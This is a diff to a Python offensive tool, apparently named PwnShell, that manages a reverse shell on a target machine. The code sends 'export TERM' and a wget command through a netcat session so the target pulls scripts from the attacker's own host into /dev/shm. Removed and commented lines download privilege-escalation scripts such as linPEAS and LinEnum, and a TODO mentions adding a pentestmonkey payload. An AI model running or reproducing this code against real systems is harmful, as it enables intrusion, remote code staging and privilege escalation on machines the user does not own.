@@ -99,7 +99,6 @@ class PwnShell:
 		print(colors.get_colored_text("\n\n[!]STAGE #2 --> [INFO] <--", ColorsSet.ORANGE))
 		self.connected = True  #To stop the thread
 		self.for_listener()
-		time.sleep(8)
 		nc.send_line(b"export TERM=xterm-256color")
 		print('[*]Uploading Shell Scripts To [/dev/shm] On Target Machine...')
 		send = f'''wget -q -r -P /dev/shm/  http://{self.ip}:9002/scripts/ ; clear'''
@@ -112,7 +111,7 @@ class PwnShell:
 		nc.close()
 
 	def for_listener(self):
-		print(f"[*]CONNECTED TO --> ['{self.ip}',{self.port}]")
+		print("[*]CONNECTION ESTABLISHED!")
 		if self.method == "get" or self.method == "GET":
 			print("[+]Vulnerable URL:",self.url)
 		else:
@@ -120,7 +119,8 @@ class PwnShell:
 		print(f"[+]Number Of Payloads Tested : [{self.iteration}]")
 		print(colors.get_colored_text("\n[!]STAGE #3 --> [STABILIZING]", ColorsSet.ORANGE))
 		print('[*]Cloning PrivESC Scripts From Their Repositories...')
-		os.system('curl -f -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -f -s https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
+		#os.system('curl -f -s https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh -o scripts/linpeas.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -o scripts/LinEnum.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh -o scripts/linux-exploit-suggester.sh  2>/dev/null ; curl -f -s https://raw.githubusercontent.com/flast101/docker-privesc/master/docker-privesc.sh -o scripts/docker-privesc.sh 2>/dev/null ; curl -f -s https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o scripts/suid3num.py 2>/dev/null')
+		time.sleep(4)
 
 
 
@@ -312,4 +312,5 @@ if __name__ == '__main__':
 		exit_gracefully()
 
 # TODO
-# Work on windows
+#Work on windows
+#ADD pentest monkey payload
